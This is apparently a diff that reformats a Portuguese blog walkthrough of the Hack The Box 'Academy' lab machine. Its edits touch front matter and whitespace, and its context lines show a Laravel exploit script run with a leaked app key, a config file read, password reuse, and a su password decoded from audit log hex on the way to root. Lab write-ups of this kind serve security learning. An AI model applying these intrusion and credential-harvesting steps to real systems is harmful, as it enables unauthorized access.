@@ -2,12 +2,13 @@
 date: 2021-02-27 16:00:00
 language: pt-BR
 localeid: htb-academy
-authors: ['default']
+authors:
+  - default
 tags:
-- Walkthrough
-- HackTheBox
-- HTB Easy
-- HTB Linux
+  - Walkthrough
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
 title: 'Walktrough: HTB Academy'
 ---
 
@@ -15,8 +16,10 @@ Olá pessoal!
 
 A máquina desta semana será **Academy**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), criada por [egre55](https://app.hackthebox.eu/users/1190) e [mrb3n](https://app.hackthebox.eu/users/2984).
 
-:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são
+  aposentadas.
+</Alert>
 
 ![HTB Academy](https://i.imgur.com/aTyV5W3.png)
 
@@ -140,7 +143,7 @@ python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz
 Após realizar o upgrade do shell reverso, primeira coisa a se checar foi o arquivo **config.php** enumerado anteriormente, o qual encontra-se listado abaixo:
 
 ```bash
-www-data@academy:/var/www/html$ cat ./academy/public/config.php 
+www-data@academy:/var/www/html$ cat ./academy/public/config.php
 <?php
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
@@ -190,7 +193,7 @@ www-data@academy:/home$ find /home -type f 2>/dev/null | grep user.txt
 Na primeira tentativa, utilizando `mySup3rP4s5w0rd!!` consegui logar com a conta cry0l1t3 e obter a flag de usuário.
 
 ```bash
-cry0l1t3@academy:~$ cat user.txt 
+cry0l1t3@academy:~$ cat user.txt
 <redacted>
 ```
 
@@ -200,7 +203,7 @@ Agora executando com a conta cry0l1t3, podemos seguir com a enumeração desta m
 
 ```bash
 cry0l1t3@academy:~$ sudo -l
-[sudo] password for cry0l1t3: 
+[sudo] password for cry0l1t3:
 Sorry, user cry0l1t3 may not run sudo on academy.
 cry0l1t3@academy:~$ id
 uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
@@ -229,7 +232,7 @@ cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '"su"'
 type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
 ```
 
-O campo *data* contém um valor em HEX do parametro utilizado nesta execução, que pode ser convertido para ASCII. Você pode utilizar qualquer conversor online mas também pode utilizar o `vim` para esta tarefa, conforme descrito abaixo:
+O campo _data_ contém um valor em HEX do parametro utilizado nesta execução, que pode ser convertido para ASCII. Você pode utilizar qualquer conversor online mas também pode utilizar o `vim` para esta tarefa, conforme descrito abaixo:
 
 - Abrir um arquivo em modo de ediçaõ com `vim`
 
@@ -243,10 +246,10 @@ vi /tmp/test
 
 - Pressionando `Esc` novamente para retornar no modo commando e digitando `:% !xxd -r` fará que o conteudo exa seja convertido para ASCII.
 
-- Você poderá salvar e sair a partir do comando `:wq!`  mas neste momento já deve ter visto o conteúdo convertido do valor HEX. Abaixo o output do arquivo que criei para realizar esta conversão:
+- Você poderá salvar e sair a partir do comando `:wq!` mas neste momento já deve ter visto o conteúdo convertido do valor HEX. Abaixo o output do arquivo que criei para realizar esta conversão:
 
 ```bash
-cat /tmp/test                    
+cat /tmp/test
 mrb3n_Ac@d3my!
 ```
 
@@ -258,7 +261,7 @@ Enumerando suas permissões, notei que ele não é membro de nenhum grupo especi
 mrb3n@academy:~$ id
 uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)
 mrb3n@academy:~$ sudo -l
-[sudo] password for mrb3n: 
+[sudo] password for mrb3n:
 Matching Defaults entries for mrb3n on academy:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
@@ -281,7 +284,7 @@ Como **root**, finalmente obtive a flag no caminho `/root/root.txt`
 ```bash
 root@academy:~# id
 uid=0(root) gid=0(root) groups=0(root)
-root@academy:~# cat root.txt 
+root@academy:~# cat root.txt
 <redacted>
 root@academy:~#
 ```
